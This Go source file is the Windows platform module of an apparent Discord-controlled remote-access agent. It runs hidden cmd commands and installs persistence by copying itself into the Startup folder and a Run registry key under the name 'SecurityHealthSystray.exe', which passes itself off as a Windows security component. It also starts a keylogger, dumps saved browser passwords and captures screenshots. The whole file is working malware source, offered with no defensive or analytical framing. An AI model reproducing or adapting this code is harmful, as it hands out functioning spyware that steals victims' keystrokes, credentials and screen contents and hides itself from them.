//go:build windows

package windows

import (
	"bytes"
	"fmt"
	"image/png"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
)

// WindowsPlatform represents the Windows platform.
type WindowsPlatform struct{}

// NewPlatform returns a new instance of the WindowsPlatform.
func NewPlatform() *WindowsPlatform {
	return &WindowsPlatform{}
}

// ExecuteCommand executes a command on Windows.
func (p *WindowsPlatform) ExecuteCommand(command string) ([]byte, error) {
	cmd := exec.Command("cmd", "/C", "chcp 65001 > nul && "+command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.CombinedOutput()
}

// InstallPersistence installs the agent in the Windows Startup folder and Registry.
func (p *WindowsPlatform) InstallPersistence() (string, error) {
	exe, err := os.Executable()
	if err != nil {
		return "", err
	}

	destDir := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	destPath := destDir + "\\SecurityHealthSystray.exe"

	input, err := os.ReadFile(exe)
	if err != nil {
		return "", err
	}
	err = os.WriteFile(destPath, input, 0755)
	if err != nil {
		return "", err
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return fmt.Sprintf("File copied to Startup, but failed to open Registry key: %v", err), nil
	}
	defer k.Close()

	if err := k.SetStringValue("SecurityHealthSystray", destPath); err != nil {
		return fmt.Sprintf("File copied to Startup, but failed to write Registry value: %v", err), nil
	}

	return "Persistence installed to Startup & Registry: " + destPath, nil
}

// Init creates a mutex to ensure only a single instance of the agent runs.
func (p *WindowsPlatform) Init() error {
	_, err := createMutex("Global\\DiscordC2AgentMutex")
	return err
}

// StartKeylogger starts the keylogger.
func (p *WindowsPlatform) StartKeylogger() {
	go startKeylogger()
}

// GetKeylogs returns the captured keylogs.
func (p *WindowsPlatform) GetKeylogs() string {
	return getKeylogs()
}

// DumpBrowsers dumps the browser passwords.
func (p *WindowsPlatform) DumpBrowsers() string {
	return DumpBrowsers()
}

// Screenshot captures the screen.
func (p *WindowsPlatform) Screenshot() ([]byte, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return nil, fmt.Errorf("no active displays found")
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, fmt.Errorf("error capturing screen: %v", err)
	}

	var buf bytes.Buffer
	err = png.Encode(&buf, img)
	if err != nil {
		return nil, fmt.Errorf("error encoding screenshot: %v", err)
	}

	return buf.Bytes(), nil
}

var (
	kernel32        = syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex = kernel32.NewProc("CreateMutexW")
)

func createMutex(name string) (uintptr, error) {
	namePtr, _ := syscall.UTF16PtrFromString(name)
	ret, _, err := procCreateMutex.Call(
		0,
		0,
		uintptr(unsafe.Pointer(namePtr)),
	)
	if ret == 0 {
		return 0, err
	}
	if err == syscall.Errno(183) { // ERROR_ALREADY_EXISTS
		return 0, fmt.Errorf("already exists")
	}
	return ret, nil
}
